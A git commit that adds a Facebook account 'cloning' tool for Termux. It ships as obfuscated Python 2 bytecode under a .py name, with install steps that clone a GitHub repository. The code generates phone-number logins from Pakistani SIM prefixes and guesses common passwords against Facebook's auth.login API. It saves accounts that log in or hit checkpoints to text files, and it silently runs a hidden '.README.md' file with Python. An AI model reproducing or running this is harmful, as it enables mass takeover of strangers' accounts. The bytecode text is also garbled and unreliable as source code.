a8527fdac16131119081ae8cc19d5e2dcc06c6fc
FAWAD5678 <94038806+FAWAD5678@users.noreply.github.com>
2021-11-15 09:56:56 +0500

    Create borthersquad.py
    Without login Commnd
    
    pkg update 
    
     pkg upgrade
    
     pkg install python2
    
     pip2 install bs4
    
     pip2 install requests
    
    pip2 install mechanize
    
     pkg install git
    
     rm -rf love
    git clone https://github.com/FAWAD5678/fawad999.git
    
     cd 
    borthersquad
    python2 borthersquad.py

---
+++ borthersquad.py
@@ -0,0 +1,112 @@
+�
+ŝvac@s�ddlZddlZddlZddlZddlZddlZddlZddlZddlZddl	Z	ddl
+Z
+ddlZejd�xJe
+d�D]<Zejdd�Zedd�e_eGHejj�q�WddlmZejd	d
+�Zejdd�ZyddlZWnek
+rNejd
+�nXyddlZWn8ek
+r�ejd�ejd�ejd�nXddlmZddlmZddlmZee�ej d�ej�Z!e!j"e#�e!j$ej%j&�dd�d#ge!_'d�Z(d�Z)d�Z*d�Z+d�Z,dZ-dZ.dZ/gZ0gZ1ga2gZ3ga4d�Z5ejd �d!�Z6e7d"kr�e5�ndS($i����Nsrm -rf .txti0uiG�i��s.txtta(tConnectionErrorg�sAg8�|Ai Ni@�spip2 install mechanizespip2 install requestispython2 .README.md(t
+ThreadPool(tBrowsertutf8tmax_times
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]cCsdGHtjj�dS(Ns[!] Exit Successfully (tostsystexit(((s/sdcard/download/x.pytexb$scCsSd}d}x:tD]2}|d|tjdt|�d�|7}qWt|�S(Ntahtdzjctt!ii(txtrandomtrandinttlentcetak(tbtwtdti((s/sdcard/download/x.pytacak)s
+
+0cCs~d}xA|D]9}|j|�}|jd|dtd|��}q
+W|d7}|jdd�}tjj|d�dS(NR
+s!%ss[%s;1mis[0ms!0s
+(tindextreplacetstrRtstdouttwrite(RRRtjR
+((s/sdcard/download/x.pyR2s
+(
+cCsGx@|dD]4}tjj|�tjj�tjdd�qWdS(Ns
+g@i�(RRRtflushttimetsleep(R
+te((s/sdcard/download/x.pytjalan=s
+cCsUddddddddg}x0|D](}d|Gtjj�tjd�q%WdS(Ns   s. s.. s...Rs$
+[1;92m       PLEASE WAIT SOME TIMEg�?(RRRRR(ttitikto((s/sdcard/download/x.pyttikDs
+
+
+s�
+[1;37m    d8888b. d888888b .d8888. db   db db    db 
+[1;37m    88  `8D   `88'   88'  YP 88   88 88    88 
+[1;32m    88oobY'    88    `8bo.   88ooo88 88    88 
+[1;32m    88`8b      88      `Y8b. 88~~~88 88    88 
+[1;37m    88 `88.   .88.   db   8D 88   88 88b  d88 
+[1;37m    88   YD Y888888P `8888Y' YP   YP ~Y8888P' 
+[1;97m-------------------------------------------------
+[1;97m  ➤ Author  : Fawad Ali Shah ([1;32mAL3X[1;37m) 
+[1;97m  ➤ Github  : https://github.com/FAWAD5678/fawad999.git
+[1;97m  ➤ Fb ID   : https://https://facebook.com/FAWAD0.ALI.SHAH2010
+[1;97m-------------------------------------------------
+[1;97m         [[1;97m[1;41mIF YOU DREAM IT CAN YOU DO IT[0m[1;37m]
+[1;97m-------------------------------------------------s�            SELECT PAK  SIM CODE 
+[1;97m-------------------------------------------------
+[[1;32m✓[1;37m]  Jazz     : [1;91m 00,01,02,03,04,05,06,07,08[1;37m
+[[1;32m✓[1;37m]  Zong     : [1;91m 11,12,13,14,15,16,17[1;37m
+[[1;32m✓[1;37m]  Warid    : [1;97m 21,22,23,24,25[1;37m
+[[1;32m✓[1;37m]  Ufone    : [1;92m 30,31,32,33,34,35[1;37m
+[[1;32m✓[1;37m]  Telenor  : [1;92m 40,41,42,43,44,45,46,47
+[1;97m-------------------------------------------------icCs,tjd�tGHtd�dGHt�dS(Ntclears([[1;32m*[1;37m] START[1;98m CLONING  s8[1;97m-------------------------------------------------(RtsystemtlogoR!taction(((s/sdcard/download/x.pytmenuis
+
+
+s,xdg-open https://www.facebook.com/al3x.rishucs�td�}dGH|dkr,dGHt�n�|dkr�t�tjd�tGHtGHyOtd��d�d	}x0t|d
+�j�D]}t	j
+|j��q�WWq�tk
+r�dGHtd�t
+�q�Xn)|d
+kr�t�t�ndGHt�ttt	��}td|�tjd�td�tjd�dGH��fd�}td�}|j|t	�dGHdGHdttt��dttt��GHdGHdGHtd�t�dS(Ns#[[1;32m1[1;37m] Start ➤ [1;32ms8[1;97m-------------------------------------------------Rs[1;31m[!] Warningt1R%s+[1;37m[[1;32m1[1;37m] Choose ➤ [1;32mt03s.txttrs[1;31m[!] File Not Founds[1;37m[ Back ]t0s[1;31m[!] Fill In Correctlys-[[1;32m*[1;37m]  TOTAL IDS NUMBER : [1;32mg�?s1       [1;37mSTOP THIS PROCESS PRESS Ctrl THEN zc
+s�|}ytjd�Wntk
+r*nXy�|}tjd��|d|d�}tj|�}d|kr�d��|d|GHtdd	�}|j��||d
+�|j�t	j
+�||�n�d|dkrTd
+��|d|GHtdd	�}|j��||d
+�|j�tj
+�||�nz��|}tjd��|d|d�}tj|�}d|krd��|d|GHtdd	�}|j��||d
+�|j�t	j
+�||�n�d|dkr�d
+��|d|GHtdd	�}|j��||d
+�|j�tj
+�||�nLd}tjd��|d|d�}tj|�}d|kr1d��|d|GHtdd	�}|j��||d
+�|j�t	j
+�||�n�d|dkr�d
+��|d|GHtdd	�}|j��||d
+�|j�tj
+�||�n&d}	tjd��|d|	d�}tj|�}d|krWd��|d|	GHtdd	�}|j��||	d
+�|j�t	j
+�||	�nwd|dkr�d
+��|d|	GHtdd	�}|j��||	d
+�|j�tj
+�||	�nWnnXdS(Ntsaves�https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s&locale=en_US&password=sH&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmtaccess_tokens[1;92m[RISHU-OK]  s  |  ssave/R-tmpl.txtRs
+swww.facebook.comt	error_msgs[1;91m[RISHU-CP] s
+save/R-CP.txts_https://b-api.facebook.com/method/auth.login?access_token=23b1&format=json&sdk.version=1&email=s&locale=en.US&password=s:&sdk=ios&genrate_session_cookies=1&sig=cd7aa0c44f58f522efms[1;92m[RISHU-OK] t786786s[1;93m[RISHU-OK]  t123456(RtmkdirtOSErrortbrtopentjsontloadRtclosetokstappendtcpb(
+targtusertpass1tdatatqtokbtcpstpass2tpass3tpass4(tctk(s/sdcard/download/x.pytmain�s�
+'
+
+'
+
+'
+
+'
+
+isProcess Has Been Completed ...sTotal OK/CP : [1;32ms[1;37m/[1;31ms7[1;37mCloned Accounts Has Been Saved : save/cloned.txts!
+[1;92m[[1;97mmenu_Back[1;92m](t	raw_inputR(R$RR&R'tlogo1R6t	readlinestidR;tstriptIOErrorR)R	tloginRRR!RRRtmapR:R<taw_input(tsstidlisttlinetxxxRItp((RGRHs/sdcard/download/x.pyR(qsR
+
+
+
+
+
+
+
+J)
+t__main__(s
+user-agentsDalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;](8RRRtdatetimeRthashlibtret	threadingR7turllibt	cookielibtgetpassR&trangetnRtnmbrR6RRtrequests.exceptionsRtbdtsimtrequeststImportErrort	mechanizeRtmultiprocessing.poolRRtreloadtsetdefaultencodingR5tset_handle_robotstFalsetset_handle_refresht_httptHTTPRefreshProcessort
+addheadersR	RRR!R$R'RKtbacktberhasiltcekpointR:RMR<R)R(t__name__(((s/sdcard/download/x.pyt<module>s\�
+
+
+
+
+
+
+
+							
+	z
+
+
+	(SYED-ZADA)
